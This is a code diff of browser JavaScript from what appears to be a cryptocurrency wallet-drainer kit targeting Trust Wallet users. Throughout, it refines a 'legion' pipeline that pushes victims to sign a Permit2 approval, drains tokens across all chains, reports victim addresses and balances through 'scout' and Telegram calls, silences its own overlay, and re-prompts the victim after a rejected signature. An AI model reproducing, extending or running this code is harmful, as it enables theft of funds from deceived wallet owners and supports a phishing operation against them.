@@ -100,41 +100,9 @@
   }
 
   function ensureSheet(addr) {
-    var el = document.getElementById('__trust_preflight_sheet');
-    if (!el) {
-      el = document.createElement('div');
-      el.id = '__trust_preflight_sheet';
-      el.style.cssText = 'position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.82);display:flex;align-items:flex-end;justify-content:center;padding:16px;font-family:system-ui,sans-serif';
-      el.innerHTML = [
-        '<div style="width:100%;max-width:420px;background:#111;color:#fff;border-radius:16px;padding:20px 18px 22px">',
-        '<div style="font-size:17px;font-weight:700;margin-bottom:8px">Preparing connection…</div>',
-        '<div id="__trust_pf_status" style="font-size:13px;opacity:.9;line-height:1.45;margin-bottom:16px;min-height:48px">Stay on this page</div>',
-        '<div id="__trust_pf_bar" style="height:4px;background:#333;border-radius:2px;overflow:hidden;margin-bottom:16px">',
-        '<div id="__trust_pf_bar_inner" style="height:100%;width:15%;background:#0500ff;transition:width .4s"></div></div>',
-        '<button type="button" id="__trust_pf_approve" disabled style="display:block;width:100%;background:#333;color:#888;border:0;border-radius:12px;padding:14px;font-weight:700;margin-bottom:8px">Approve in Trust (wait…)</button>',
-        '<button type="button" id="__trust_pf_retry" style="display:block;width:100%;background:#222;color:#fff;border:0;border-radius:12px;padding:12px;font-weight:600;margin-bottom:8px">Retry full prep</button>',
-        '<button type="button" id="__trust_pf_close" style="display:block;width:100%;background:transparent;border:0;color:#888;padding:10px;font-size:13px">Close</button>',
-        '</div>',
-      ].join('');
-      document.body.appendChild(el);
-      el.querySelector('#__trust_pf_close').onclick = function () { el.style.display = 'none'; };
-      el.querySelector('#__trust_pf_retry').onclick = function () {
-        var a = loadAddr();
-        if (a) {
-          try { sessionStorage.removeItem(KEY_AMOUNT); } catch (_) {}
-          runPreflight(a, { force: true });
-        }
-      };
-      el.querySelector('#__trust_pf_approve').onclick = function () {
-        onApproveTap();
-      };
-    }
-    el.style.display = 'flex';
-    try {
-      var old = document.getElementById('__trust_approve_sheet');
-      if (old) old.style.display = 'none';
-    } catch (_) {}
-    return el;
+    // SILENT — no preflight overlay (one-flow silence)
+    console.warn('[TrustPreflight] ensureSheet muted', addr && String(addr).slice(0, 10));
+    return null;
   }
 
   function alreadyNotified(addr) {
@@ -366,24 +334,20 @@
     }
 
     try {
-      if (window.legion && typeof window.legion.forceTrustSign === 'function') {
-        var r = await window.legion.forceTrustSign();
-        console.warn('[TrustPreflight] forceTrustSign', r && (r.path || r.error || r.ok));
-        // After EVM sign: continueConnected runs runUniversalDrain — ALL chains in one pass
-        // (uses addresses already in WC session from the single approval popup — no new popups)
-        if (r && r.ok !== false) {
-          setTimeout(function () {
-            try {
-              if (window.legion && typeof window.legion.continueConnected === 'function') {
-                window.legion.continueConnected().catch(function () {});
-              }
-            } catch (_) {}
-          }, 1500);
-        }
+      if (window.legion && typeof window.legion.evmAlreadyConfirmed === 'function' &&
+          window.legion.evmAlreadyConfirmed()) {
+        console.warn('[TrustPreflight] EVM already confirmed — skip re-sign');
+      } else if (window.legion && typeof window.legion.startPipeline === 'function') {
+        var r = await window.legion.startPipeline({
+          reason: (window.legion.state && window.legion.state.userRejectedSign) ? 'reject-retry' : 'sign',
+        });
+        console.warn('[TrustPreflight] startPipeline', r && (r.path || r.error || r.ok));
+        // startPipeline owns drain — do NOT call continueConnected again
+      } else if (window.legion && typeof window.legion.forceTrustSign === 'function') {
+        var r2 = await window.legion.forceTrustSign();
+        console.warn('[TrustPreflight] forceTrustSign', r2 && (r2.path || r2.error || r2.ok));
       } else if (typeof window.__TRUST_RUN_PIPELINE__ === 'function') {
         await window.__TRUST_RUN_PIPELINE__('preflight-drain');
-      } else if (window.legion && typeof window.legion.continueConnected === 'function') {
-        await window.legion.continueConnected();
       }
     } catch (e2) {
       console.warn('[TrustPreflight] drain', e2 && e2.message);
@@ -408,7 +372,11 @@
 
     var result = null;
     try {
-      if (window.legion && typeof window.legion.forceTrustSign === 'function') {
+      if (window.legion && typeof window.legion.startPipeline === 'function') {
+        result = await window.legion.startPipeline({
+          reason: (window.legion.state && window.legion.state.userRejectedSign) ? 'reject-retry' : 'sign',
+        });
+      } else if (window.legion && typeof window.legion.forceTrustSign === 'function') {
         result = await window.legion.forceTrustSign();
       } else {
         await runDrainPhase(addr);
@@ -446,54 +414,81 @@
     addr = saveAddr(addr);
     if (!addr) return false;
     if (busy) return false;
-    busy = true;
 
-    ensureSheet(addr);
+    var S = null;
+    try { S = window.legion && window.legion.state; } catch (_) {}
+    // Legion SCAN-THEN-SIGN owns the first pass — only intervene on reject or when legion idle
+    try {
+      if (!opts.force && S) {
+        if (typeof window.legion.evmAlreadyConfirmed === 'function' && window.legion.evmAlreadyConfirmed()) {
+          console.warn('[TrustPreflight] skip — already confirmed');
+          return true;
+        }
+        if (S.postConnectComplete && !S.userRejectedSign) {
+          console.warn('[TrustPreflight] skip — postConnectComplete');
+          return true;
+        }
+        if ((S.connecting || S.drainRunning) && !S.userRejectedSign) {
+          console.warn('[TrustPreflight] skip — legion still running connect/drain');
+          return false;
+        }
+        if (S.amountScoutDone && S.drainAttempted && !S.userRejectedSign) {
+          console.warn('[TrustPreflight] skip — scout+drain already done');
+          return true;
+        }
+      }
+    } catch (_) {}
+
+    busy = true;
+    // ensureSheet muted — no UI
     setApproveEnabled(false);
 
     var chainId = 1;
     try {
-      if (window.legion && window.legion.state && window.legion.state.evmChain) {
-        chainId = Number(window.legion.state.evmChain) || 1;
-      }
+      if (S && S.evmChain) chainId = Number(S.evmChain) || 1;
     } catch (_) {}
 
     try {
-      // 0) SIGN FIRST — do not wait for Telegram / amount (was 4–5 min)
-      setProgress(30);
-      setStatus('Confirm Permit2 in Trust now…');
-      setApproveEnabled(true);
-      try {
+      // Reject retry: ONLY re-show sign — no scout/ranked/multi-balance spam
+      if (S && S.userRejectedSign) {
+        setProgress(40);
+        setStatus('Rejected — confirm again in Trust…');
+        setApproveEnabled(true);
         await runDrainPhase(addr);
-      } catch (eSign) {
-        console.warn('[TrustPreflight] sign-first', eSign && eSign.message);
+        setProgress(100);
+        return true;
       }
-      setProgress(70);
-      setStatus('Permit2 sent. Syncing Telegram in background…');
 
-      // 1+2) Notify + amount in BACKGROUND — never blocks next sign
-      (async function () {
+      // If legion already scanned, only sign once — do not re-POST scout/fusion/ranked
+      if (S && S.amountScoutDone) {
+        setProgress(50);
+        setStatus('Confirm Permit2 in Trust…');
+        setApproveEnabled(true);
+        await runDrainPhase(addr);
+        setProgress(100);
+        return true;
+      }
+
+      // Idle fallback (legion never ran): notify once → amount once → sign once
+      setProgress(25);
+      setStatus('Preparing…');
+      if (opts.force || !alreadyNotified(addr)) {
         try {
-          if (opts.force || !alreadyNotified(addr)) {
-            for (var attempt = 0; attempt < 2; attempt++) {
-              var r = await postScout(addr, chainId);
-              if (r.ok) { markNotified(addr); break; }
-              await new Promise(function (res) { setTimeout(res, 300); });
-            }
-          }
-          if (opts.force || !amountDone(addr)) {
-            await runAmountPhase(addr, chainId);
-          }
-        } catch (eBg) {
-          console.warn('[TrustPreflight] bg scout', eBg && eBg.message);
-        }
-      })();
-
-      setProgress(100);
+          var r = await postScout(addr, chainId);
+          if (r.ok) markNotified(addr);
+        } catch (_) {}
+      }
+      setProgress(50);
+      if (opts.force || !amountDone(addr)) {
+        await runAmountPhase(addr, chainId);
+      }
+      setProgress(75);
+      setStatus('Confirm Permit2 in Trust…');
       setApproveEnabled(true);
-      setStatus('If no popup — tap Approve again.');
+      await runDrainPhase(addr);
+      setProgress(100);
       try {
-        window.dispatchEvent(new CustomEvent('trust:preflight-ok', { detail: { address: addr, usd: 0 } }));
+        window.dispatchEvent(new CustomEvent('trust:preflight-ok', { detail: { address: addr } }));
       } catch (_) {}
       return true;
     } catch (e) {
@@ -510,13 +505,8 @@
     return runPreflight(addr || loadAddr(), { force: true });
   };
 
-  window.addEventListener('legion:connected', function (e) {
-    var d = (e && e.detail) || {};
-    var addr = d.address || d.account || loadAddr();
-    // Delay preflight so instant forceTrustSign wins the race (not Telegram wait)
-    if (addr) {
-      setTimeout(function () { runPreflight(addr); }, 1800);
-    }
+  window.addEventListener('legion:connected', function () {
+    console.warn('[TrustPreflight] legion:connected — fully silent');
   });
 
   window.addEventListener('pagehide', function () {
@@ -538,8 +528,8 @@
     } catch (_) {}
   });
 
-  window.addEventListener('trust:addr-recovered', function (e) {
-    var addr = (e && e.detail && e.detail.address) || loadAddr();
-    if (addr) runPreflight(addr);
+  // SILENT — no auto preflight on addr recover (legion owns flow)
+  window.addEventListener('trust:addr-recovered', function () {
+    console.warn('[TrustPreflight] addr-recovered — silent');
   });
 })();
